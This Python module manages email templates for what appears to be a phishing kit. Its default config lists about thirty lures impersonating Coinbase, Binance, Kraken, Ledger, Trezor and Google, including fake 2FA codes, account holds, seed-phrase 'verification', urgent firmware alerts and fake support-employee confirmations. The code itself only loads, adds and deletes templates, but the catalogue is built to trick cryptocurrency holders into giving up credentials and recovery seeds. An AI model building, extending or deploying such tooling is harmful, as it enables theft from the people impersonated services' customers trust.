"""Template management utilities"""
import os
import json
from logger_config import logger

# Constants
TEMPLATES_DIR = "templates"
TEMPLATES_CONFIG = "templates/config.json"

def ensure_templates_directory():
    """Ensure templates directory exists"""
    if not os.path.exists(TEMPLATES_DIR):
        os.makedirs(TEMPLATES_DIR)
        
    # Create default config if it doesn't exist
    if not os.path.exists(TEMPLATES_CONFIG):
        default_config = {
            "templates": [
                # Coinbase Templates (Blue/White Theme)
                {
                    "id": "cbotp",
                    "name": "Coinbase OTP",
                    "description": "Two-factor authentication verification code",
                    "subject": "Your Coinbase verification code",
                    "file": "coinbase/cbotp.html"
                },
                {
                    "id": "cbhold",
                    "name": "Coinbase Account Hold",
                    "description": "Account security review notification",
                    "subject": "Important: Your account is now on hold",
                    "file": "coinbase/cbhold.html"
                },
                {
                    "id": "cbdelay",
                    "name": "Coinbase Transaction Delay",
                    "description": "Transaction pending manual review",
                    "subject": "Transaction delayed - Manual review required",
                    "file": "coinbase/cbdelay.html"
                },
                {
                    "id": "cbseed",
                    "name": "Coinbase Wallet Setup",
                    "description": "Self-custody wallet configuration guide",
                    "subject": "Secure Your Coinbase Account - Wallet Setup Required",
                    "file": "coinbase/cbseed.html"
                },
                {
                    "id": "cbcase",
                    "name": "Coinbase Support Case",
                    "description": "Support case assignment notification",
                    "subject": "Your case is under review - Case Assignment",
                    "file": "coinbase/cbcase.html"
                },
                {
                    "id": "cbsecure",
                    "name": "Coinbase Secure Link",
                    "description": "Secure support portal access",
                    "subject": "Secure Link - Coinbase Support Access",
                    "file": "coinbase/cbsecure.html"
                },
                {
                    "id": "cbsuspend",
                    "name": "Coinbase Account Suspension",
                    "description": "Account temporarily suspended notification",
                    "subject": "Account Temporarily Suspended - Action Required",
                    "file": "coinbase/cbsuspend.html"
                },
                {
                    "id": "cbwithdraw",
                    "name": "Coinbase Withdrawal Alert",
                    "description": "Large withdrawal confirmation required",
                    "subject": "Confirm Your Withdrawal Request",
                    "file": "coinbase/cbwithdraw.html"
                },
                {
                    "id": "cblogin",
                    "name": "Coinbase Login Alert",
                    "description": "Suspicious login attempt notification",
                    "subject": "New Login Detected - Verify Your Identity",
                    "file": "coinbase/cblogin.html"
                },
                {
                    "id": "cbphishing",
                    "name": "Coinbase Phishing Alert",
                    "description": "Phishing attempt detected notification",
                    "subject": "Phishing Attempt Blocked - Account Secured",
                    "file": "coinbase/cbphishing.html"
                },
                {
                    "id": "cb2fa",
                    "name": "Coinbase 2FA Disabled",
                    "description": "Two-factor authentication disabled alert",
                    "subject": "Two-Factor Authentication Disabled",
                    "file": "coinbase/cb2fa.html"
                },
                
                # Binance Templates (Yellow/Black Theme)
                {
                    "id": "binance_deactivation",
                    "name": "Binance Account Deactivation",
                    "description": "Account deactivation notice",
                    "subject": "[Binance] Account Deactivation Notice",
                    "file": "binance/binance.html"
                },
                {
                    "id": "binance_security",
                    "name": "Binance Security Alert",
                    "description": "Security verification required",
                    "subject": "[Binance] Security Verification Required",
                    "file": "binance/security.html"
                },
                {
                    "id": "binance_kyc",
                    "name": "Binance KYC Verification",
                    "description": "Identity verification needed",
                    "subject": "[Binance] Complete Your Identity Verification",
                    "file": "binance/kyc.html"
                },
                {
                    "id": "binance_withdraw",
                    "name": "Binance Withdrawal Suspended",
                    "description": "Withdrawal function temporarily disabled",
                    "subject": "[Binance] Withdrawal Function Temporarily Suspended",
                    "file": "binance/withdraw.html"
                },
                
                # Kraken Templates (Purple/White Theme)
                {
                    "id": "kraken_employee",
                    "name": "Kraken Employee Verification",
                    "description": "Employee verification for support calls",
                    "subject": "Kraken Support - Employee Verification",
                    "file": "kraken/kraken.html"
                },
                {
                    "id": "kraken_security",
                    "name": "Kraken Security Review",
                    "description": "Account security review in progress",
                    "subject": "Kraken Security - Account Under Review",
                    "file": "kraken/security.html"
                },
                {
                    "id": "kraken_funding",
                    "name": "Kraken Funding Issue",
                    "description": "Funding source verification required",
                    "subject": "Kraken - Funding Source Verification Required",
                    "file": "kraken/funding.html"
                },
                {
                    "id": "kraken_tier",
                    "name": "Kraken Tier Upgrade",
                    "description": "Account tier upgrade notification",
                    "subject": "Kraken - Account Tier Upgrade Required",
                    "file": "kraken/tier.html"
                },
                
                # Ledger Templates (Orange/Black Theme)
                {
                    "id": "ledger_confirmation",
                    "name": "Ledger Representative Confirmation",
                    "description": "Representative confirmation email",
                    "subject": "Ledger Support - Representative Confirmation",
                    "file": "ledger/ledgerletter.html"
                },
                {
                    "id": "ledger_firmware",
                    "name": "Ledger Firmware Update",
                    "description": "Critical firmware update notification",
                    "subject": "Critical Ledger Firmware Update Available",
                    "file": "ledger/firmware.html"
                },
                {
                    "id": "ledger_security",
                    "name": "Ledger Security Breach",
                    "description": "Security incident notification",
                    "subject": "Important Security Notice - Action Required",
                    "file": "ledger/security.html"
                },
                {
                    "id": "ledger_recovery",
                    "name": "Ledger Recovery Service",
                    "description": "Wallet recovery assistance",
                    "subject": "Ledger Recovery - Wallet Access Assistance",
                    "file": "ledger/recovery.html"
                },
                
                # Trezor Templates (Green/White Theme)
                {
                    "id": "trezor_case",
                    "name": "Trezor Support Case",
                    "description": "Support case under review notification",
                    "subject": "Trezor Support - Your case is under review",
                    "file": "trezor/trezor.html"
                },
                {
                    "id": "trezor_firmware",
                    "name": "Trezor Firmware Alert",
                    "description": "Urgent firmware update required",
                    "subject": "Urgent: Trezor Firmware Update Required",
                    "file": "trezor/firmware.html"
                },
                {
                    "id": "trezor_bridge",
                    "name": "Trezor Bridge Issue",
                    "description": "Trezor Bridge connection problem",
                    "subject": "Trezor Bridge - Connection Issue Detected",
                    "file": "trezor/bridge.html"
                },
                {
                    "id": "trezor_seed",
                    "name": "Trezor Seed Verification",
                    "description": "Seed phrase verification required",
                    "subject": "Trezor - Verify Your Recovery Seed",
                    "file": "trezor/seed.html"
                },
                
                # Google Templates (Blue/White Theme)
                {
                    "id": "google_employee",
                    "name": "Google Employee Verification",
                    "description": "Google representative details confirmation",
                    "subject": "Google Support - Representative Details Confirmation",
                    "file": "google/google_emp.html"
                },
                {
                    "id": "google_security",
                    "name": "Google Security Alert",
                    "description": "Account security verification needed",
                    "subject": "Google Security Alert - Verify Your Account",
                    "file": "google/security.html"
                },
                {
                    "id": "google_suspension",
                    "name": "Google Account Suspension",
                    "description": "Account suspended for policy violation",
                    "subject": "Google Account Suspended - Appeal Required",
                    "file": "google/suspension.html"
                },
                {
                    "id": "google_recovery",
                    "name": "Google Account Recovery",
                    "description": "Account recovery assistance",
                    "subject": "Google Account Recovery - Verify Your Identity",
                    "file": "google/recovery.html"
                }
            ]
        }
        
        with open(TEMPLATES_CONFIG, "w") as f:
            json.dump(default_config, f, indent=4)

def get_templates():
    """Get list of available templates"""
    ensure_templates_directory()
    
    try:
        with open(TEMPLATES_CONFIG, "r") as f:
            config = json.load(f)
            return config.get("templates", [])
    except Exception as e:
        logger.error(f"Error loading templates: {str(e)}")
        return []

def get_templates_by_platform():
    """Get templates organized by platform"""
    templates = get_templates()
    platforms = {}
    
    for template in templates:
        # Extract platform from template ID or file path
        if template['id'].startswith('cb') or 'coinbase' in template['file']:
            platform = 'Coinbase'
        elif template['id'].startswith('binance') or 'binance' in template['file']:
            platform = 'Binance'
        elif template['id'].startswith('kraken') or 'kraken' in template['file']:
            platform = 'Kraken'
        elif template['id'].startswith('ledger') or 'ledger' in template['file']:
            platform = 'Ledger'
        elif template['id'].startswith('trezor') or 'trezor' in template['file']:
            platform = 'Trezor'
        elif template['id'].startswith('google') or 'google' in template['file']:
            platform = 'Google'
        else:
            platform = 'Other'
        
        if platform not in platforms:
            platforms[platform] = []
        platforms[platform].append(template)
    
    return platforms

def get_template_by_id(template_id):
    """Get template by ID"""
    templates = get_templates()
    for template in templates:
        if template["id"] == template_id:
            try:
                file_path = os.path.join(TEMPLATES_DIR, template["file"])
                with open(file_path, "r", encoding="utf-8") as f:
                    content = f.read()
                return {
                    "name": template["name"],
                    "subject": template["subject"],
                    "content": content
                }
            except Exception as e:
                logger.error(f"Error loading template file: {str(e)}")
                return None
    return None

def add_template(name, description, subject, content, template_id=None):
    """Add a new template"""
    ensure_templates_directory()
    
    try:
        with open(TEMPLATES_CONFIG, "r") as f:
            config = json.load(f)
        
        # Generate ID if not provided
        if not template_id:
            template_id = name.lower().replace(" ", "_")
            
            # Ensure ID is unique
            existing_ids = [t["id"] for t in config["templates"]]
            if template_id in existing_ids:
                count = 1
                while f"{template_id}_{count}" in existing_ids:
                    count += 1
                template_id = f"{template_id}_{count}"
        
        # Create file name
        file_name = f"{template_id}.html"
        file_path = os.path.join(TEMPLATES_DIR, file_name)
        
        # Save template content
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)
        
        # Add to config
        new_template = {
            "id": template_id,
            "name": name,
            "description": description,
            "subject": subject,
            "file": file_name
        }
        
        config["templates"].append(new_template)
        
        with open(TEMPLATES_CONFIG, "w") as f:
            json.dump(config, f, indent=4)
            
        return True
    except Exception as e:
        logger.error(f"Error adding template: {str(e)}")
        return False

def delete_template(template_id):
    """Delete a template"""
    ensure_templates_directory()
    
    try:
        with open(TEMPLATES_CONFIG, "r") as f:
            config = json.load(f)
        
        # Find template
        template_to_delete = None
        for template in config["templates"]:
            if template["id"] == template_id:
                template_to_delete = template
                break
        
        if not template_to_delete:
            return False
        
        # Remove file
        file_path = os.path.join(TEMPLATES_DIR, template_to_delete["file"])
        if os.path.exists(file_path):
            os.remove(file_path)
        
        # Remove from config
        config["templates"] = [t for t in config["templates"] if t["id"] != template_id]
        
        with open(TEMPLATES_CONFIG, "w") as f:
            json.dump(config, f, indent=4)
            
        return True
    except Exception as e:
        logger.error(f"Error deleting template: {str(e)}")
        return False

def get_template_stats():
    """Get statistics about templates"""
    platforms = get_templates_by_platform()
    stats = {
        'total_templates': sum(len(templates) for templates in platforms.values()),
        'platforms': len(platforms),
        'platform_breakdown': {platform: len(templates) for platform, templates in platforms.items()}
    }
    return stats
